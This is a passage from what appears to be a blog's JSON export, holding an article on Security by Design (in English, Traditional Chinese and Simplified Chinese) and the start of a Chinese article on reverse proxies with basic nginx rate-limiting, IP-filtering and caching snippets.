threats to a system. It involves analyzing the system’s design, identifying potential threat agents, determining the likelihood of these threats, and prioritizing them based on potential impact. This is akin to an architect considering all possible natural disasters while designing a building, ensuring it can withstand earthquakes, floods, or other calamities. Control Validation: Once security controls are implemented, control validation is the process of verifying that these controls are effective and function as intended. This step is similar to a quality assurance process in manufacturing, where products are tested to ensure they meet the required safety standards before being released to the market. Automation: In the context of Security by Design, automation refers to the use of technology to perform security-related tasks without human intervention. This can include automated security scanning, continuous integration/continuous deployment (CI/CD) pipelines with integrated security checks, and automated incident response. Automation in security is like having a state-of-the-art home security system that not only alerts homeowners of an intrusion but also takes immediate action to lock down the house and notify authorities. Security Principles: The principles of security, such as confidentiality, integrity, and availability—often referred to as the CIA triad—serve as the guiding tenets for Security by Design. These principles ensure that information remains confidential (accessible only to those authorized), maintains its integrity (is accurate and reliable), and is available when needed. These practices are interconnected; threat modeling informs control validation, and automation aids in the consistent application of the controls identified through threat modeling. graph TD A(Threat Modeling) -->|Identifies Risks| B[Security Controls] B -->|Implements| C[Control Validation] C -->|Verifies Effectiveness| D{Controls Effective?} D -->|Yes| E[Automation] D -->|No| F[Remediation] F -->|Updates| B E -->|Continuous Monitoring| C E -->|Scales Security| G(Consistent Protection) style A fill:#87CEEB style E fill:#90EE90 style G fill:#FFD700 Automating Control Validation and Remediation: Enhancing Security by Design With the control validation from different stage, a critical element to have successful security by design is the automation of control validation and remediation, which serves to reinforce the system’s defenses and streamline the security management process. Automated Control Validation Control validation is the process of ensuring that security measures are not only in place but are also effective and functioning as intended. Automating this process means employing tools and technologies that can continuously and consistently verify the effectiveness of security controls without the need for manual intervention. For instance, automated security control validation can involve the use of software that simulates attacks on a system to test the response of its defenses. This is akin to conducting regular fire drills to ensure that both the fire alarm and the sprinkler system are working correctly and that the occupants know how to respond in case of an actual fire. Automated Remediation Automated remediation takes the concept a step further by not only detecting security issues but also resolving them autonomously. This can include patching vulnerabilities, isolating infected systems, or blocking malicious activities in real-time. Imagine a self-healing material that automatically repairs cracks as soon as they appear, maintaining its integrity without the need for external intervention. What Could Happen if Security by Design Fails? When Security by Design is not implemented or fails, the consequences can be severe: Data Breaches: Without security built into the foundation, systems become vulnerable to unauthorized access. The 2017 Equifax breach, affecting 147 million people, resulted from unpatched vulnerabilities – a failure to maintain security by design principles. Financial Losses: Remediation costs, regulatory fines, and lost business can be devastating. The average cost of a data breach in 2023 exceeded $4.45 million, not including long-term reputation damage. Operational Disruption: Security incidents can halt business operations. Ransomware attacks have forced hospitals to divert patients and manufacturers to shut down production lines. Loss of Trust: Customer confidence, once broken, is difficult to rebuild. Organizations that experience breaches often see lasting impacts on customer retention and brand value. Regulatory Penalties: Non-compliance with regulations like GDPR, HIPAA, or PCI-DSS can result in substantial fines and legal consequences. ⚠️ The Cost of FailureOrganizations that treat security as an afterthought often pay 10-100 times more in breach response and remediation than they would have spent implementing Security by Design from the start. The technical debt of insecure systems compounds over time. Anti-Patterns to Security by Design Recognizing and avoiding these common anti-patterns is crucial: 1. Security Theater: Implementing visible but ineffective security measures that create a false sense of security. Like TSA security checks that look thorough but miss actual threats. 2. The “We’ll Fix It Later” Mentality: Deferring security considerations to future sprints or releases. Security debt accumulates faster than technical debt and is more costly to address. 3. Over-Reliance on Tools: Believing that purchasing security tools alone will solve security problems without proper integration, configuration, and processes. 4. Siloed Security Teams: Keeping security separate from development teams, creating an “us vs. them” dynamic that slows down both security and development. 5. One-Size-Fits-All Approach: Applying the same security controls to all systems regardless of their risk profile, threat model, or business context. 6. Ignoring the Human Factor: Focusing solely on technical controls while neglecting user training, secure coding practices, and security awareness. 7. Checkbox Compliance: Treating security frameworks as checklists to complete rather than guidelines for building secure systems. 🚫 Common PitfallThe most dangerous anti-pattern is assuming that passing a security audit means your system is secure. Audits are snapshots in time; Security by Design is a continuous practice. Challenges and Quick Wins The challenges in implementing Security by Design are not insignificant. It requires a shift in mindset, from reactive to proactive, and often involves a cultural change within an organization. However, the quick wins – such as preventing major breaches and building customer trust – make it a worthwhile investment. Key Challenges: Initial time and resource investment Resistance to changing established workflows Balancing security with usability and speed Keeping pace with evolving threats ✨ Quick WinsStart with high-impact, low-effort initiatives: Implement automated security scanning in CI/CD pipelines Conduct threat modeling for critical systems Enable security by default configurations Establish secure coding guidelines Create security champions within development teams These foundational steps provide immediate value while building momentum for broader Security by Design adoption. Do not forget Risk-Based Approach In the intricate world of cybersecurity, “Security by Design” and the “Risk-Based Approach” are two methodologies that, when combined, offer a comprehensive strategy for protecting digital assets. Security by Design is the practice of incorporating security features and considerations into the design and architecture of systems and software from the beginning. On the other hand, the Risk-Based Approach is a method of prioritizing and managing cybersecurity efforts based on the assessment of risks, their likelihood, and potential impact. The relationship between Security by Design and the Risk-Based Approach is symbiotic. Security by Design lays the groundwork for a secure system, while the Risk-Based Approach ensures that the security measures are aligned with the most significant and probable threats. This combination allows organizations to allocate resources efficiently and effectively, focusing on the areas of highest risk. Integration of Risk-Based Approach in Security by Design The Risk-Based Approach complements Security by Design by introducing a dynamic element to the static design process. It involves continuous risk assessment and management throughout the system’s lifecycle, ensuring that the security measures remain relevant as new threats emerge. For example, just as an architect designs a building to withstand various environmental risks, such as earthquakes or floods, a cybersecurity professional uses the Risk-Based Approach to anticipate and mitigate cyber risks specific to the system’s environment. Benefits of a Combined Approach Prioritization of Security Efforts: By understanding the risks, organizations can prioritize security efforts, focusing on the most critical areas first. Resource Optimization: It helps in optimizing the use of resources by directing them to the areas where they are needed the most, rather than spreading them thinly across all possible security measures. Adaptability: A Risk-Based Approach ensures that Security by Design remains adaptable and responsive to the evolving threat landscape. Compliance and Governance: It aids in compliance with regulatory requirements by demonstrating a structured approach to identifying and mitigating risks. Challenges in Implementation While the integration of a Risk-Based Approach within Security by Design offers numerous advantages, it also presents challenges. It requires a deep understanding of the threat landscape, the ability to assess risks accurately, and the agility to adapt security measures as risks evolve. Organizations must also contend with the complexity of balancing security with functionality and usability. Practical Application in Enterprises Enterprises can apply this combined approach by conducting regular risk assessments, using threat intelligence to inform design decisions, and implementing security controls that address the most significant risks. For instance, an enterprise might prioritize encrypting sensitive data over other security measures if the risk assessment indicates that data theft is the highest risk. Beyond Security by Design Beyond Security by Design, there is an ongoing journey towards “Resilient by Design,” where systems are not only secure but also capable of withstanding and recovering from attacks, ensuring continuity of operations and services. In conclusion, Security by Design is the cornerstone of modern cybersecurity strategy, a fundamental approach that, when effectively implemented, can significantly reduce the risk of cyber threats and safeguard the digital infrastructure upon which businesses and societies increasingly rely. Further Reading Red Hat - Security by design: Security principles and threat modeling","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[]},{"title":"安全設計 - 網路安全的架構藍圖","slug":"2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity/","permalink":"https://neo01.com/zh-TW/2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity/","excerpt":"安全設計不是事後添加。探索威脅建模、自動化和基於風險的方法如何將安全性嵌入系統DNA。","text":"什麼是安全設計？ 在數位時代，網路威脅迫在眉睫，「安全設計」已成為將強大的網路安全防禦建構到軟體和系統結構中的架構藍圖。這是一種主動方法，從一開始就整合安全措施，而不是事後才想到。這個概念類似於建造一棟具有堅固基礎和整合安全系統的建築，而不是在建築完成後才添加鎖和警報。 安全設計不僅僅是添加保護層；而是將安全性嵌入系統的 DNA 中。它與將安全性視為外圍或次要功能的做法形成鮮明對比，這可以比喻為在稻草屋上安裝鋼門——門可能是安全的，但整體結構仍然脆弱。 什麼不是安全設計？ 了解安全設計不是什麼有助於澄清其真正本質： 附加式安全：在開發完成後添加安全功能不是安全設計。這種被動方法就像在一棟窗戶未鎖的房子裡安裝安全系統——你在處理症狀而不是根本原因。 僅合規心態：滿足最低監管要求而不考慮實際威脅不是安全設計。這就像建造符合最低規範而不是為實際條件設計。 隱蔽式安全：依賴保持系統細節秘密而不是建構本質上安全的系統不是安全設計。這類似於將房子鑰匙藏在門墊下——只有在有人知道在哪裡找之前才有效。 僅周邊防禦：僅專注於外部防禦而忽視內部安全不是安全設計。現代威脅需要深度防禦，而不僅僅是堅固的外牆。 graph LR A(安全設計) -->|主動| B(從一開始建構) A -->|全面| C(每層都受保護) A -->|威脅感知| D(基於真實風險) E(不是安全設計) -->|被動| F(事後添加) E -->|表面| G(僅周邊) E -->|合規驅動| H(勾選框安全) style A fill:#90EE90 style E fill:#FFB6C6 相比之下，「預設安全」是開箱即用設定應該盡可能安全的原則。想像購買一部智慧型手機，預設啟用所有必要的隱私設定，而不是需要手動調整這些設定來保護您的資料。 威脅建模、控制驗證、自動化和安全原則是安全設計方法的基本組成部分，每個都在強化組織數位基礎設施的安全態勢方面發揮關鍵作用。 威脅建模：這是主動識別和理解系統潛在安全威脅的過程。它涉及分析系統的設計、識別潛在威脅代理、確定這些威脅的可能性，並根據潛在影響對它們進行優先排序。這類似於建築師在設計建築時考慮所有可能的自然災害，確保它能夠承受地震、洪水或其他災難。 控制驗證：一旦實施安全控制，控制驗證就是驗證這些控制是否有效並按預期運作的過程。這一步類似於製造業的品質保證過程，在產品發布到市場之前測試產品以確保它們符合所需的安全標準。 自動化：在安全設計的背景下，自動化是指使用技術在沒有人工干預的情況下執行與安全相關的任務。這可以包括自動安全掃描、持續整合/持續部署（CI/CD）管道與整合的安全檢查，以及自動事件回應。安全中的自動化就像擁有最先進的家庭安全系統，不僅在入侵時警告房主，還立即採取行動鎖定房子並通知當局。 安全原則：安全原則，例如機密性、完整性和可用性——通常稱為 CIA 三元組——作為安全設計的指導原則。這些原則確保資訊保持機密（僅授權人員可訪問）、保持其完整性（準確可靠），並在需要時可用。 這些實踐是相互關聯的；威脅建模為控制驗證提供資訊，自動化有助於一致應用通過威脅建模識別的控制。 graph TD A(威脅建模) -->|識別風險| B[安全控制] B -->|實施| C[控制驗證] C -->|驗證有效性| D{控制有效？} D -->|是| E[自動化] D -->|否| F[補救] F -->|更新| B E -->|持續監控| C E -->|擴展安全| G(一致保護) style A fill:#87CEEB style E fill:#90EE90 style G fill:#FFD700 自動化控制驗證和補救：增強安全設計 通過不同階段的控制驗證，成功安全設計的關鍵要素是自動化控制驗證和補救，這有助於加強系統的防禦並簡化安全管理過程。 自動化控制驗證 控制驗證是確保安全措施不僅到位而且有效並按預期運作的過程。自動化這個過程意味著使用工具和技術，可以持續一致地驗證安全控制的有效性，而無需手動干預。 例如，自動化安全控制驗證可以涉及使用軟體模擬對系統的攻擊，以測試其防禦的回應。這類似於進行定期消防演習，以確保火災警報和灑水系統都正常工作，並且居住者知道在實際火災情況下如何回應。 自動化補救 自動化補救將這個概念更進一步，不僅檢測安全問題，還自主解決它們。這可以包括修補漏洞、隔離受感染的系統或即時阻止惡意活動。想像一種自我修復材料，一旦出現裂縫就會自動修復，在不需要外部干預的情況下保持其完整性。 如果安全設計失敗會發生什麼？ 當安全設計未實施或失敗時，後果可能是嚴重的： 資料洩露：沒有建構到基礎中的安全性，系統變得容易受到未經授權的訪問。2017 年 Equifax 洩露事件影響了 1.47 億人，源於未修補的漏洞——未能維護安全設計原則。 財務損失：補救成本、監管罰款和業務損失可能是毀滅性的。2023 年資料洩露的平均成本超過 445 萬美元，不包括長期聲譽損害。 營運中斷：安全事件可能會停止業務營運。勒索軟體攻擊迫使醫院轉移患者，製造商關閉生產線。 信任喪失：客戶信心一旦破裂，很難重建。經歷洩露的組織通常會看到對客戶保留和品牌價值的持久影響。 監管處罰：不遵守 GDPR、HIPAA 或 PCI-DSS 等法規可能導致大量罰款和法律後果。 ⚠️ 失敗的代價將安全性視為事後才想到的組織通常在洩露回應和補救方面支付的費用是從一開始實施安全設計的 10-100 倍。不安全系統的技術債務隨著時間的推移而累積。 安全設計的反模式 認識和避免這些常見的反模式至關重要： 1. 安全劇場：實施可見但無效的安全措施，創造虛假的安全感。就像 TSA 安全檢查看起來很徹底但錯過實際威脅。 2. 「我們稍後修復」心態：將安全考量推遲到未來的衝刺或發布。安全債務累積速度比技術債務更快，解決成本更高。 3. 過度依賴工具：相信購買安全工具本身就能解決安全問題，而沒有適當的整合、配置和流程。 4. 孤立的安全團隊：將安全性與開發團隊分開，創造「我們對他們」的動態，減慢安全性和開發速度。 5. 一刀切方法：對所有系統應用相同的安全控制，無論其風險概況、威脅模型或業務背景如何。 6. 忽視人為因素：僅專注於技術控制，同時忽視使用者培訓、安全編碼實踐和安全意識。 7. 勾選框合規：將安全框架視為要完成的清單，而不是建構安全系統的指南。 🚫 常見陷阱最危險的反模式是假設通過安全審計意味著您的系統是安全的。審計是時間快照；安全設計是持續實踐。 挑戰和快速勝利 實施安全設計的挑戰並不小。它需要心態的轉變，從被動到主動，通常涉及組織內的文化變革。然而，快速勝利——例如防止重大洩露和建立客戶信任——使其成為值得的投資。 主要挑戰： 初始時間和資源投資 抵制改變既定工作流程 平衡安全性與可用性和速度 跟上不斷演變的威脅 ✨ 快速勝利從高影響、低努力的倡議開始： 在 CI/CD 管道中實施自動安全掃描 對關鍵系統進行威脅建模 啟用預設安全配置 建立安全編碼指南 在開發團隊中創建安全冠軍 這些基礎步驟提供即時價值，同時為更廣泛的安全設計採用建立動力。 不要忘記基於風險的方法 在複雜的網路安全世界中，「安全設計」和「基於風險的方法」是兩種方法，當結合時，為保護數位資產提供全面的策略。安全設計是從一開始就將安全功能和考量納入系統和軟體的設計和架構的實踐。另一方面，基於風險的方法是一種根據風險評估、其可能性和潛在影響來優先處理和管理網路安全工作的方法。 安全設計和基於風險的方法之間的關係是共生的。安全設計為安全系統奠定基礎，而基於風險的方法確保安全措施與最重大和可能的威脅保持一致。這種組合允許組織有效地分配資源，專注於最高風險的領域。 在安全設計中整合基於風險的方法 基於風險的方法通過在靜態設計過程中引入動態元素來補充安全設計。它涉及在系統的整個生命週期中進行持續的風險評估和管理，確保安全措施隨著新威脅的出現而保持相關。例如，就像建築師設計建築以承受各種環境風險（例如地震或洪水）一樣，網路安全專業人員使用基於風險的方法來預測和緩解特定於系統環境的網路風險。 結合方法的好處 安全工作的優先排序：通過了解風險，組織可以優先處理安全工作，首先專注於最關鍵的領域。 資源優化：它有助於優化資源的使用，將它們引導到最需要的領域，而不是將它們稀疏地分散到所有可能的安全措施上。 適應性：基於風險的方法確保安全設計保持適應性並對不斷演變的威脅環境做出回應。 合規和治理：它通過展示識別和緩解風險的結構化方法來幫助遵守監管要求。 實施中的挑戰 雖然在安全設計中整合基於風險的方法提供了眾多優勢，但它也帶來了挑戰。它需要對威脅環境的深入理解、準確評估風險的能力，以及隨著風險演變而調整安全措施的敏捷性。組織還必須應對平衡安全性與功能性和可用性的複雜性。 企業中的實際應用 企業可以通過進行定期風險評估、使用威脅情報為設計決策提供資訊，以及實施解決最重大風險的安全控制來應用這種結合方法。例如，如果風險評估表明資料盜竊是最高風險，企業可能會優先加密敏感資料而不是其他安全措施。 超越安全設計 超越安全設計，有一個持續的旅程朝向「彈性設計」，系統不僅安全，而且能夠承受和從攻擊中恢復，確保營運和服務的連續性。 總之，安全設計是現代網路安全策略的基石，一種基本方法，當有效實施時，可以顯著降低網路威脅的風險，並保護企業和社會日益依賴的數位基礎設施。 延伸閱讀 Red Hat - Security by design: Security principles and threat modeling","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[],"lang":"zh-TW"},{"title":"安全设计 - 网络安全的架构蓝图","slug":"2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity/","permalink":"https://neo01.com/zh-CN/2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity/","excerpt":"安全设计不是事后添加。探索威胁建模、自动化和基于风险的方法如何将安全性嵌入系统DNA。","text":"什么是安全设计？ 在数字时代，网络威胁迫在眉睫，&quot;安全设计&quot;已成为将强大的网络安全防御构建到软件和系统结构中的架构蓝图。这是一种主动方法，从一开始就集成安全措施，而不是事后才想到。这个概念类似于建造一栋具有坚固基础和集成安全系统的建筑，而不是在建筑完成后才添加锁和警报。 安全设计不仅仅是添加保护层；而是将安全性嵌入系统的 DNA 中。它与将安全性视为外围或次要功能的做法形成鲜明对比，这可以比喻为在稻草屋上安装钢门——门可能是安全的，但整体结构仍然脆弱。 什么不是安全设计？ 了解安全设计不是什么有助于澄清其真正本质： 附加式安全：在开发完成后添加安全功能不是安全设计。这种被动方法就像在一栋窗户未锁的房子里安装安全系统——你在处理症状而不是根本原因。 仅合规心态：满足最低监管要求而不考虑实际威胁不是安全设计。这就像建造符合最低规范而不是为实际条件设计。 隐蔽式安全：依赖保持系统细节秘密而不是构建本质上安全的系统不是安全设计。这类似于将房子钥匙藏在门垫下——只有在有人知道在哪里找之前才有效。 仅周边防御：仅专注于外部防御而忽视内部安全不是安全设计。现代威胁需要深度防御，而不仅仅是坚固的外墙。 graph LR A(安全设计) -->|主动| B(从一开始构建) A -->|全面| C(每层都受保护) A -->|威胁感知| D(基于真实风险) E(不是安全设计) -->|被动| F(事后添加) E -->|表面| G(仅周边) E -->|合规驱动| H(勾选框安全) style A fill:#90EE90 style E fill:#FFB6C6 相比之下，&quot;默认安全&quot;是开箱即用设置应该尽可能安全的原则。想象购买一部智能手机，默认启用所有必要的隐私设置，而不是需要手动调整这些设置来保护您的数据。 威胁建模、控制验证、自动化和安全原则是安全设计方法的基本组成部分，每个都在强化组织数字基础设施的安全态势方面发挥关键作用。 威胁建模：这是主动识别和理解系统潜在安全威胁的过程。它涉及分析系统的设计、识别潜在威胁代理、确定这些威胁的可能性，并根据潜在影响对它们进行优先排序。这类似于建筑师在设计建筑时考虑所有可能的自然灾害，确保它能够承受地震、洪水或其他灾难。 控制验证：一旦实施安全控制，控制验证就是验证这些控制是否有效并按预期运作的过程。这一步类似于制造业的质量保证过程，在产品发布到市场之前测试产品以确保它们符合所需的安全标准。 自动化：在安全设计的背景下，自动化是指使用技术在没有人工干预的情况下执行与安全相关的任务。这可以包括自动安全扫描、持续集成/持续部署（CI/CD）管道与集成的安全检查，以及自动事件响应。安全中的自动化就像拥有最先进的家庭安全系统，不仅在入侵时警告房主，还立即采取行动锁定房子并通知当局。 安全原则：安全原则，例如机密性、完整性和可用性——通常称为 CIA 三元组——作为安全设计的指导原则。这些原则确保信息保持机密（仅授权人员可访问）、保持其完整性（准确可靠），并在需要时可用。 这些实践是相互关联的；威胁建模为控制验证提供信息，自动化有助于一致应用通过威胁建模识别的控制。 graph TD A(威胁建模) -->|识别风险| B[安全控制] B -->|实施| C[控制验证] C -->|验证有效性| D{控制有效？} D -->|是| E[自动化] D -->|否| F[补救] F -->|更新| B E -->|持续监控| C E -->|扩展安全| G(一致保护) style A fill:#87CEEB style E fill:#90EE90 style G fill:#FFD700 自动化控制验证和补救：增强安全设计 通过不同阶段的控制验证，成功安全设计的关键要素是自动化控制验证和补救，这有助于加强系统的防御并简化安全管理过程。 自动化控制验证 控制验证是确保安全措施不仅到位而且有效并按预期运作的过程。自动化这个过程意味着使用工具和技术，可以持续一致地验证安全控制的有效性，而无需手动干预。 例如，自动化安全控制验证可以涉及使用软件模拟对系统的攻击，以测试其防御的响应。这类似于进行定期消防演习，以确保火灾警报和洒水系统都正常工作，并且居住者知道在实际火灾情况下如何响应。 自动化补救 自动化补救将这个概念更进一步，不仅检测安全问题，还自主解决它们。这可以包括修补漏洞、隔离受感染的系统或实时阻止恶意活动。想象一种自我修复材料，一旦出现裂缝就会自动修复，在不需要外部干预的情况下保持其完整性。 如果安全设计失败会发生什么？ 当安全设计未实施或失败时，后果可能是严重的： 数据泄露：没有构建到基础中的安全性，系统变得容易受到未经授权的访问。2017 年 Equifax 泄露事件影响了 1.47 亿人，源于未修补的漏洞——未能维护安全设计原则。 财务损失：补救成本、监管罚款和业务损失可能是毁灭性的。2023 年数据泄露的平均成本超过 445 万美元，不包括长期声誉损害。 运营中断：安全事件可能会停止业务运营。勒索软件攻击迫使医院转移患者，制造商关闭生产线。 信任丧失：客户信心一旦破裂，很难重建。经历泄露的组织通常会看到对客户保留和品牌价值的持久影响。 监管处罚：不遵守 GDPR、HIPAA 或 PCI-DSS 等法规可能导致大量罚款和法律后果。 ⚠️ 失败的代价将安全性视为事后才想到的组织通常在泄露响应和补救方面支付的费用是从一开始实施安全设计的 10-100 倍。不安全系统的技术债务随着时间的推移而累积。 安全设计的反模式 认识和避免这些常见的反模式至关重要： 1. 安全剧场：实施可见但无效的安全措施，创造虚假的安全感。就像 TSA 安全检查看起来很彻底但错过实际威胁。 2. &quot;我们稍后修复&quot;心态：将安全考量推迟到未来的冲刺或发布。安全债务累积速度比技术债务更快，解决成本更高。 3. 过度依赖工具：相信购买安全工具本身就能解决安全问题，而没有适当的集成、配置和流程。 4. 孤立的安全团队：将安全性与开发团队分开，创造&quot;我们对他们&quot;的动态，减慢安全性和开发速度。 5. 一刀切方法：对所有系统应用相同的安全控制，无论其风险概况、威胁模型或业务背景如何。 6. 忽视人为因素：仅专注于技术控制，同时忽视用户培训、安全编码实践和安全意识。 7. 勾选框合规：将安全框架视为要完成的清单，而不是构建安全系统的指南。 🚫 常见陷阱最危险的反模式是假设通过安全审计意味着您的系统是安全的。审计是时间快照；安全设计是持续实践。 挑战和快速胜利 实施安全设计的挑战并不小。它需要心态的转变，从被动到主动，通常涉及组织内的文化变革。然而，快速胜利——例如防止重大泄露和建立客户信任——使其成为值得的投资。 主要挑战： 初始时间和资源投资 抵制改变既定工作流程 平衡安全性与可用性和速度 跟上不断演变的威胁 ✨ 快速胜利从高影响、低努力的倡议开始： 在 CI/CD 管道中实施自动安全扫描 对关键系统进行威胁建模 启用默认安全配置 建立安全编码指南 在开发团队中创建安全冠军 这些基础步骤提供即时价值，同时为更广泛的安全设计采用建立动力。 不要忘记基于风险的方法 在复杂的网络安全世界中，&quot;安全设计&quot;和&quot;基于风险的方法&quot;是两种方法，当结合时，为保护数字资产提供全面的策略。安全设计是从一开始就将安全功能和考量纳入系统和软件的设计和架构的实践。另一方面，基于风险的方法是一种根据风险评估、其可能性和潜在影响来优先处理和管理网络安全工作的方法。 安全设计和基于风险的方法之间的关系是共生的。安全设计为安全系统奠定基础，而基于风险的方法确保安全措施与最重大和可能的威胁保持一致。这种组合允许组织有效地分配资源，专注于最高风险的领域。 在安全设计中集成基于风险的方法 基于风险的方法通过在静态设计过程中引入动态元素来补充安全设计。它涉及在系统的整个生命周期中进行持续的风险评估和管理，确保安全措施随着新威胁的出现而保持相关。例如，就像建筑师设计建筑以承受各种环境风险（例如地震或洪水）一样，网络安全专业人员使用基于风险的方法来预测和缓解特定于系统环境的网络风险。 结合方法的好处 安全工作的优先排序：通过了解风险，组织可以优先处理安全工作，首先专注于最关键的领域。 资源优化：它有助于优化资源的使用，将它们引导到最需要的领域，而不是将它们稀疏地分散到所有可能的安全措施上。 适应性：基于风险的方法确保安全设计保持适应性并对不断演变的威胁环境做出响应。 合规和治理：它通过展示识别和缓解风险的结构化方法来帮助遵守监管要求。 实施中的挑战 虽然在安全设计中集成基于风险的方法提供了众多优势，但它也带来了挑战。它需要对威胁环境的深入理解、准确评估风险的能力，以及随着风险演变而调整安全措施的敏捷性。组织还必须应对平衡安全性与功能性和可用性的复杂性。 企业中的实际应用 企业可以通过进行定期风险评估、使用威胁情报为设计决策提供信息，以及实施解决最重大风险的安全控制来应用这种结合方法。例如，如果风险评估表明数据盗窃是最高风险，企业可能会优先加密敏感数据而不是其他安全措施。 超越安全设计 超越安全设计，有一个持续的旅程朝向&quot;弹性设计&quot;，系统不仅安全，而且能够承受和从攻击中恢复，确保运营和服务的连续性。 总之，安全设计是现代网络安全策略的基石，一种基本方法，当有效实施时，可以显著降低网络威胁的风险，并保护企业和社会日益依赖的数字基础设施。 延伸阅读 Red Hat - Security by design: Security principles and threat modeling","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[],"lang":"zh-CN"},{"title":"理解反向代理：企業架構中的無名英雄","slug":"2024/09/Understanding-Reverse-Proxy-zh-TW","date":"un00fin00","updated":"un22fin22","comments":false,"path":"/zh-TW/2024/09/Understanding-Reverse-Proxy/","permalink":"https://neo01.com/zh-TW/2024/09/Understanding-Reverse-Proxy/","excerpt":"你是否好奇用戶和後端伺服器之間有什麼？了解為什麼反向代理在企業設計中不可或缺，以及它是否真的是另一個故障點。","text":"你造訪一個網站。你點擊一個按鈕。在幕後，你的請求並不會直接到達運行應用程式的伺服器。相反，它會先碰到其他東西——反向代理。 大多數用戶從不知道它的存在。但對於企業架構師來說，它是不可或缺的。 什麼是反向代理？ 反向代理是一個位於客戶端和後端伺服器之間的伺服器，將客戶端請求轉發到適當的後端伺服器，並將伺服器的回應返回給客戶端。 關鍵區別： **正向代理：**位於客戶端前面，代表客戶端向伺服器轉發請求 **反向代理：**位於伺服器前面，代表伺服器向客戶端轉發請求 現實世界類比 將反向代理想像成飯店禮賓部： 沒有反向代理： 客人直接敲員工的門（廚師、管家、經理） 每個員工處理自己的門 多個客人到達時一片混亂 沒人知道誰忙或誰有空 有反向代理： 所有客人先到禮賓台 禮賓知道該聯繫哪位員工 均勻分配請求 優雅地處理繁忙時段 員工可以不受干擾地工作 禮賓不做實際工作——他們有效地路由請求並保護員工不被壓垮。 反向代理如何運作？ flowchart LR Client[\"👤 客戶端(瀏覽器)\"] RP[\"🚪 反向代理(nginx/Traefik)\"] subgraph Backend[\"後端伺服器\"] App1[\"🖥️ 應用伺服器 1\"] App2[\"🖥️ 應用伺服器 2\"] App3[\"🖥️ 應用伺服器 3\"] end Client -->|\"1. 請求\"| RP RP -->|\"2. 轉發\"| App1 RP -.->|\"負載平衡\"| App2 RP -.->|\"負載平衡\"| App3 App1 -->|\"3. 回應\"| RP RP -->|\"4. 返回\"| Client style RP fill:#fff3e0 style Backend fill:#e8f5e9 請求流程： 客戶端發送請求 → https://example.com/api/users DNS 解析 → 指向反向代理 IP 反向代理接收 → 檢查請求（URL、標頭、方法） 路由決策 → 決定使用哪個後端伺服器 轉發請求 → 發送到後端伺服器 後端處理 → 生成回應 代理返回 → 將回應發送回客戶端 客戶端看到的： 請求：https:&#x2F;&#x2F;example.com&#x2F;api&#x2F;users 回應：200 OK 實際發生的： 客戶端 → 反向代理 (203.0.113.10) 反向代理 → 後端伺服器 (10.0.1.5:8080) 後端伺服器 → 反向代理 反向代理 → 客戶端 客戶端永遠不知道後端伺服器的真實 IP 位址或端口。 為什麼企業設計需要反向代理 1. 負載平衡 **問題：**單一伺服器無法處理高峰時段的所有流量。 **解決方案：**反向代理在多個伺服器之間分配請求。 100 請求&#x2F;秒 → 反向代理 ├─&gt; 伺服器 1 (33 請求&#x2F;秒) ├─&gt; 伺服器 2 (33 請求&#x2F;秒) └─&gt; 伺服器 3 (34 請求&#x2F;秒) 負載平衡演算法： **輪詢：**依序分配請求 **最少連接：**發送到活動連接最少的伺服器 **IP 雜湊：**同一客戶端總是到同一伺服器（會話持久性） **加權：**根據伺服器容量分配 實際影響： 沒有負載平衡： 伺服器 1：過載（崩潰） 伺服器 2：閒置 伺服器 3：閒置 結果：服務中斷 有負載平衡： 所有伺服器均勻分擔負載 沒有單一過載點 如果一個失敗，優雅降級 2. SSL/TLS 終止 **問題：**每個後端伺服器都需要 SSL 憑證和加密開銷。 **解決方案：**反向代理處理所有 SSL/TLS 加密/解密。 flowchart LR Client[\"👤 客戶端\"] RP[\"🚪 反向代理\"] App1[\"🖥️ 應用伺服器 1\"] App2[\"🖥️ 應用伺服器 2\"] Client |\"🔒 HTTPS(加密)\"| RP RP |\"HTTP(明文)\"| App1 RP |\"HTTP(明文)\"| App2 style RP fill:#fff3e0 優點： **單一憑證：**在一個地方管理 SSL 憑證 **降低 CPU 負載：**後端伺服器不解密流量 **簡化更新：**更新 SSL 配置無需觸碰應用程式 **集中式安全：**統一強制執行 TLS 版本和加密套件 成本節省： 沒有反向代理：10 伺服器 × $50/憑證 = $500/年 有反向代理：1 伺服器 × $50/憑證 = $50/年 3. 安全層 **問題：**後端伺服器直接暴露於網際網路攻擊。 **解決方案：**反向代理充當安全屏障。 保護機制： 隱藏後端基礎設施： 客戶端看到：https:&#x2F;&#x2F;api.example.com 真實後端：http:&#x2F;&#x2F;10.0.1.5:8080（隱藏） 速率限制： # 限制每個 IP 每秒 10 個請求 limit_req_zone $binary_remote_addr zone&#x3D;api:10m rate&#x3D;10r&#x2F;s; IP 過濾： # 封鎖特定 IP deny 192.168.1.100; # 只允許特定範圍 allow 10.0.0.0&#x2F;8; deny all; DDoS 緩解： 每個 IP 的連接限制 請求速率限制 自動封鎖濫用 IP Web 應用程式防火牆（WAF）： SQL 注入檢測 XSS 攻擊預防 惡意負載過濾 4. 快取 **問題：**後端伺服器重複生成相同的回應。 **解決方案：**反向代理快取回應，減少後端負載。 快取流程： 第一次請求： 客戶端 → 代理（快取未命中）→ 後端 → 生成回應 ← 儲存在快取 ← 返回 後續請求： 客戶端 → 代理（快取命中）→ 返回快取的回應 （不觸碰後端） 效能影響： 情境 回應時間 後端負載 無快取 200ms 100% 50% 快取命中 110ms 50% 90% 快取命中 38ms 10% 快取範例： # 快取靜態資源 1 天 location ~* \\.(jpg|jpeg|png|css|js)$ &#123; proxy_cache my_cache; proxy_cache_valid 200 1d; proxy_pass http:&#x2F;&#x2F;backend; &#125; 5. 簡化路由 **問題：**多個服務在不同端口/伺服器上，對客戶端來說很複雜。 **解決方案：**單一入口點，基於路徑的路由。 沒有反向代理： 